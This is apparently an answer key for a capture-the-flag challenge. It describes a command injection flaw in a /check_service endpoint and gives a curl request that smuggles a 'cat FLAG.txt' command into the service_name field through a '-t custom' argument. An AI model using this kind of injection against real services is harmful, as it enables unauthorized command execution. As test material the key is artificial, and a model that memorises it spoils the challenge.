# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: OS command injection via an incomplete blacklist on `/check_service`.
The backend shell script exposes a `custom` command mode; passing
`-t custom "<cmd>"` as the `service_name` runs an arbitrary command.

1. **POST a `service_name` that invokes the custom command** to read the flag:

   ```
   curl -s -X POST http://<target>/check_service \
     -H "Content-Type: application/json" \
     -d '{"service_name": "-t custom \"cat FLAG.txt\""}'
   ```

2. **Extract the flag** (`FLAG{...}`) from the `status` field in the JSON response
   (it precedes the script's `true` success marker) and report it verbatim.
